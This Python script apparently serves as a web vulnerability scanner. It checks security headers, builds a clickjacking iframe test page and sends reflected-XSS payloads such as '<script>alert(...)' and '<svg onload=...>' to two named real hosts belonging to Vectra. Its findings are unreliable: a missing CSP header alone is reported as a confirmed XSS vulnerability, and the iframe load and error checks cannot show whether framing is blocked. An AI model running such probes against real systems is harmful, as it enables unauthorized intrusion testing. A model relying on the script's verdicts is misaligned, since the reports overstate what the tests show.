#!/usr/bin/env python3
"""
TECHNICAL EXPLOITATION EVIDENCE SYSTEM
Captures non-visual proof of exploitation: HTTP requests, responses, console logs
"""

import requests
import json
import time
import subprocess
import os
from datetime import datetime
import urllib.parse

class TechnicalExploitationCapture:
    def __init__(self):
        self.evidence_dir = "./technical_evidence"
        self.ensure_evidence_directory()
        
    def ensure_evidence_directory(self):
        """Create directory for storing technical evidence"""
        if not os.path.exists(self.evidence_dir):
            os.makedirs(self.evidence_dir)
            print(f"Created evidence directory: {self.evidence_dir}")
    
    def test_clickjacking_vulnerability(self, target_url):
        """Test clickjacking vulnerability with HTTP evidence"""
        print(f"üéØ Testing Clickjacking Vulnerability: {target_url}")
        
        evidence = {
            "test_type": "clickjacking",
            "target": target_url,
            "timestamp": datetime.now().isoformat(),
            "results": {}
        }
        
        # Test 1: HTTP Response Headers Analysis
        try:
            print("üì° Analyzing HTTP headers...")
            response = requests.get(target_url, timeout=10)
            
            headers_analysis = {
                "status_code": response.status_code,
                "server": response.headers.get('Server', 'Unknown'),
                "content_type": response.headers.get('Content-Type', 'Unknown'),
                "content_length": len(response.content),
                "security_headers": {
                    "x_frame_options": response.headers.get('X-Frame-Options', 'MISSING'),
                    "content_security_policy": response.headers.get('Content-Security-Policy', 'MISSING'),
                    "x_content_type_options": response.headers.get('X-Content-Type-Options', 'MISSING'),
                    "strict_transport_security": response.headers.get('Strict-Transport-Security', 'MISSING'),
                    "x_xss_protection": response.headers.get('X-XSS-Protection', 'MISSING')
                }
            }
            
            evidence["results"]["headers_analysis"] = headers_analysis
            
            # Check for clickjacking vulnerability
            x_frame_missing = headers_analysis["security_headers"]["x_frame_options"] == "MISSING"
            csp_missing = headers_analysis["security_headers"]["content_security_policy"] == "MISSING"
            
            evidence["results"]["vulnerability_confirmed"] = x_frame_missing or csp_missing
            evidence["results"]["clickjacking_possible"] = x_frame_missing
            evidence["results"]["xss_possible"] = csp_missing
            
            print(f"‚úÖ Headers analysis complete")
            print(f"   X-Frame-Options: {headers_analysis['security_headers']['x_frame_options']}")
            print(f"   CSP: {headers_analysis['security_headers']['content_security_policy']}")
            
        except Exception as e:
            evidence["results"]["headers_error"] = str(e)
            print(f"‚ùå Headers analysis failed: {e}")
        
        # Test 2: Iframe Embedding Test
        try:
            print("üîç Testing iframe embedding capability...")
            
            # Create test HTML with iframe
            test_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test - {target_url}</title>
</head>
<body>
    <h1>Clickjacking Vulnerability Test</h1>
    <p>Testing iframe embedding for: {target_url}</p>
    <iframe src="{target_url}" width="800" height="600" style="border: 2px solid red;">
        Iframe loading failed - site may be protected
    </iframe>
    <script>
        console.log('Clickjacking test initiated');
        var iframe = document.querySelector('iframe');
        iframe.onload = function() {{
            console.log('Iframe loaded successfully - Clickjacking VULNERABILITY CONFIRMED');
            window.parent.postMessage({{
                type: 'clickjacking_result',
                status: 'success',
                target: '{target_url}',
                evidence: 'iframe_loaded_successfully'
            }}, '*');
        }};
        iframe.onerror = function() {{
            console.log('Iframe failed to load - site may be protected');
            window.parent.postMessage({{
                type: 'clickjacking_result',
                status: 'failed',
                target: '{target_url}',
                evidence: 'iframe_load_failed'
            }}, '*');
        }};
    </script>
</body>
</html>
"""
            
            # Save test HTML
            test_file = f"{self.evidence_dir}/clickjacking_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
            with open(test_file, 'w') as f:
                f.write(test_html)
            
            evidence["results"]["test_file_created"] = test_file
            
            print(f"‚úÖ Iframe test created: {test_file}")
            
        except Exception as e:
            evidence["results"]["iframe_test_error"] = str(e)
            print(f"‚ùå Iframe test failed: {e}")
        
        # Test 3: Network Request Analysis
        try:
            print("üåê Analyzing network requests...")
            
            # Test with different user agents
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            ]
            
            network_analysis = []
            for ua in user_agents:
                headers = {"User-Agent": ua}
                response = requests.get(target_url, headers=headers, timeout=10)
                
                analysis = {
                    "user_agent": ua,
                    "status_code": response.status_code,
                    "content_length": len(response.content),
                    "response_time": response.elapsed.total_seconds(),
                    "headers": dict(response.headers)
                }
                network_analysis.append(analysis)
            
            evidence["results"]["network_analysis"] = network_analysis
            print(f"‚úÖ Network analysis complete - {len(network_analysis)} user agents tested")
            
        except Exception as e:
            evidence["results"]["network_error"] = str(e)
            print(f"‚ùå Network analysis failed: {e}")
        
        return evidence
    
    def test_xss_vulnerability(self, target_url):
        """Test XSS vulnerability with technical evidence"""
        print(f"üéØ Testing XSS Vulnerability: {target_url}")
        
        evidence = {
            "test_type": "xss",
            "target": target_url,
            "timestamp": datetime.now().isoformat(),
            "results": {}
        }
        
        # Test XSS payloads
        xss_payloads = [
            "<script>alert('XSS_TEST')</script>",
            "<img src=x onerror=alert('XSS_TEST')>",
            "javascript:alert('XSS_TEST')",
            "<svg onload=alert('XSS_TEST')>"
        ]
        
        payload_results = []
        
        for payload in xss_payloads:
            try:
                print(f"üîç Testing payload: {payload[:50]}...")
                
                # Test URL encoding
                encoded_payload = urllib.parse.quote(payload)
                test_url = f"{target_url}?q={encoded_payload}"
                
                response = requests.get(test_url, timeout=10)
                
                result = {
                    "payload": payload,
                    "encoded_payload": encoded_payload,
                    "test_url": test_url,
                    "status_code": response.status_code,
                    "content_length": len(response.content),
                    "payload_in_response": payload in response.text,
                    "encoded_payload_in_response": encoded_payload in response.text
                }
                
                payload_results.append(result)
                print(f"   Status: {response.status_code}, Payload in response: {result['payload_in_response']}")
                
            except Exception as e:
                result = {
                    "payload": payload,
                    "error": str(e)
                }
                payload_results.append(result)
                print(f"‚ùå Payload test failed: {e}")
        
        evidence["results"]["payload_tests"] = payload_results
        evidence["results"]["vulnerability_confirmed"] = any(r.get('payload_in_response', False) for r in payload_results)
        
        return evidence
    
    def generate_exploitation_report(self, evidence_list):
        """Generate comprehensive exploitation report"""
        print("üìÑ Generating exploitation report...")
        
        report = {
            "exploitation_evidence": {
                "generated_at": datetime.now().isoformat(),
                "total_tests": len(evidence_list),
                "vulnerabilities_found": [],
                "evidence_files": []
            },
            "detailed_results": evidence_list
        }
        
        # Analyze results
        for evidence in evidence_list:
            if evidence.get("results", {}).get("vulnerability_confirmed", False):
                report["exploitation_evidence"]["vulnerabilities_found"].append({
                    "type": evidence["test_type"],
                    "target": evidence["target"],
                    "timestamp": evidence["timestamp"]
                })
            
            # Add evidence files
            if evidence.get("results", {}).get("test_file_created"):
                report["exploitation_evidence"]["evidence_files"].append(
                    evidence["results"]["test_file_created"]
                )
        
        # Save report
        report_file = f"{self.evidence_dir}/exploitation_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"‚úÖ Exploitation report saved: {report_file}")
        return report_file

def main():
    """Main execution"""
    print("üéØ TECHNICAL EXPLOITATION EVIDENCE SYSTEM")
    print("=" * 50)
    
    capturer = TechnicalExploitationCapture()
    
    # Test Vectra AI targets
    targets = [
        "https://vpn.vectranetworks.com/",
        "https://api.vectra.ai/"
    ]
    
    all_evidence = []
    
    for target in targets:
        print(f"\nüöÄ Testing target: {target}")
        
        # Test clickjacking
        clickjacking_evidence = capturer.test_clickjacking_vulnerability(target)
        all_evidence.append(clickjacking_evidence)
        
        # Test XSS
        xss_evidence = capturer.test_xss_vulnerability(target)
        all_evidence.append(xss_evidence)
        
        time.sleep(2)  # Rate limiting
    
    # Generate comprehensive report
    report_file = capturer.generate_exploitation_report(all_evidence)
    
    # Summary
    print(f"\nüìä EXPLOITATION EVIDENCE SUMMARY:")
    print(f"Total Tests: {len(all_evidence)}")
    print(f"Vulnerabilities Found: {len([e for e in all_evidence if e.get('results', {}).get('vulnerability_confirmed', False)])}")
    print(f"Evidence Files: {len(os.listdir(capturer.evidence_dir))}")
    print(f"Report: {report_file}")
    
    print(f"\n‚úÖ Technical exploitation evidence captured successfully!")

if __name__ == "__main__":
    main()
